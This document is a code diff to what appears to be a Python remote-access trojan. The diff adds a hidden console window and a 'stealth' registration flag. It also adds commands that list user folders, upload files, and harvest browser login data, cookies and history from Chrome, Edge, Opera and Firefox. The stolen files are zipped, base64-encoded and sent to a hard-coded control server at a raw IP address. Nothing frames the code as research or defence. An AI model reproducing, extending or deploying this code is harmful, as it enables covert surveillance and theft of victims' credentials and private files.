@@ -5,6 +5,8 @@ import platform
 import hashlib
 from threading import Thread, Lock
 import uuid
+import shutil
+import zipfile
 import sys
 import pyautogui
 import os
@@ -29,8 +31,15 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import pyperclip
 from pynput import mouse
 import pythoncom
-
 SERVER_URL = "http://193.124.121.76:4443"
+
+def hide_console():
+    if sys.platform == "win32":
+        whnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if whnd != 0:
+            ctypes.windll.user32.ShowWindow(whnd, 0)
+
+hide_console()
 
 def generate_device_id():
     pc_name = platform.node()
@@ -46,6 +55,89 @@ def get_system_info():
         "processor": platform.processor(),
         "ip": socket.gethostbyname(socket.gethostname())
     }
+
+def get_directory_listing(self, path):
+    try:
+        if not os.path.exists(path):
+            return f"Путь не существует: {path}", None, None
+        
+        items = os.listdir(path)
+        listing = []
+        for item in items:
+            full_path = os.path.join(path, item)
+            if os.path.isdir(full_path):
+                listing.append(f"[DIR] {item}")
+            else:
+                size = os.path.getsize(full_path)
+                listing.append(f"[FILE] {item} ({size} bytes)")
+        
+        result = "\n".join(listing)
+        return f"Содержимое {path}:\n{result}", None, None
+    except Exception as e:
+        return f"Ошибка чтения директории: {str(e)}", None, None
+
+def download_file(self, path):
+    try:
+        if not os.path.exists(path):
+            return f"Файл не существует: {path}", None, None
+        
+        if os.path.getsize(path) > 10 * 1024 * 1024:  # 10MB limit
+            return "Файл слишком большой (макс. 10 МБ)", None, None
+        
+        with open(path, "rb") as f:
+            file_data = base64.b64encode(f.read()).decode('utf-8')
+        
+        return f"Файл {os.path.basename(path)} успешно прочитан", file_data, 'file'
+    except Exception as e:
+        return f"Ошибка чтения файла: {str(e)}", None, None
+
+def get_browser_data(self, browser):
+    try:
+        browser_paths = {
+            'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data'),
+            'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data'),
+            'opera': os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable'),
+            'firefox': os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
+        }
+        
+        if browser not in browser_paths:
+            return f"Неизвестный браузер: {browser}", None, None
+        
+        path = browser_paths[browser]
+        if not os.path.exists(path):
+            return f"Путь к данным браузера не найден: {path}", None, None
+        
+        # Ищем важные файлы
+        important_files = []
+        for root, dirs, files in os.walk(path):
+            for file in files:
+                if file.lower() in ['login data', 'cookies', 'history', 'web data', 'bookmarks', 'preferences']:
+                    important_files.append(os.path.join(root, file))
+        
+        if not important_files:
+            return f"Не найдены важные файлы для браузера {browser}", None, None
+        
+        # Создаем временный архив
+        import tempfile
+        temp_dir = tempfile.mkdtemp()
+        zip_path = os.path.join(temp_dir, f"{browser}_data.zip")
+        
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for file in important_files:
+                try:
+                    zipf.write(file, os.path.basename(file))
+                except Exception as e:
+                    print(f"Ошибка добавления файла {file} в архив: {e}")
+        
+        with open(zip_path, "rb") as f:
+            file_data = base64.b64encode(f.read()).decode('utf-8')
+        
+        # Удаляем временные файлы
+        shutil.rmtree(temp_dir)
+        
+        return f"Данные браузера {browser} собраны", file_data, 'file'
+    except Exception as e:
+        return f"Ошибка получения данных браузера: {str(e)}", None, None
 
 class PCClient:
     def __init__(self):
@@ -72,7 +164,8 @@ class PCClient:
                 data = {
                     "device_id": self.device_id,
                     "system_info": self.system_info,
-                    "status": "online"
+                    "status": "online",
+                    "stealth": True
                 }
                 
                 response = requests.post(
@@ -82,7 +175,7 @@ class PCClient:
                 )
                 
                 if response.status_code == 200:
-                    print(f"Устройство {self.device_id} успешно зарегистрировано")
+                    print(f"Устройство {self.device_id} успешно зарегистрировано (СКРЫТЫЙ РЕЖИМ)")
                     return True
                 else:
                     print(f"Ошибка регистрации: {response.status_code} - {response.text}")
@@ -442,6 +535,21 @@ class PCClient:
                     result = f"Длительная запись аудио завершена"
                 else:
                     result = "Запись не велась"
+            elif cmd.startswith('ls:'):
+                path = cmd[len('ls:'):].strip()
+                if path == 'desktop':
+                    path = os.path.join(os.path.expanduser('~'), 'Desktop')
+                elif path == 'downloads':
+                    path = os.path.join(os.path.expanduser('~'), 'Downloads')
+                elif path == 'documents':
+                    path = os.path.join(os.path.expanduser('~'), 'Documents')
+                result, file_data, file_type = self.get_directory_listing(path)
+            elif cmd.startswith('download:'):
+                path = cmd[len('download:'):].strip()
+                result, file_data, file_type = self.download_file(path)
+            elif cmd.startswith('browser:'):
+                browser = cmd[len('browser:'):].strip().lower()
+                result, file_data, file_type = self.get_browser_data(browser)
             self.send_command_result(command['id'], result, file_data, file_type)
         except Exception as e:
             print(f"Ошибка выполнения команды: {e}")
@@ -474,11 +582,6 @@ class PCClient:
     
     def record_video(self, seconds):
         try:
-            import pyautogui
-            import numpy as np
-            import cv2
-            import time
-            import os
             screen_size = (800, 600)
             fourcc = cv2.VideoWriter_fourcc(*'MJPG')
             temp_file = f"temp_screenvideo_{self.device_id}.avi"
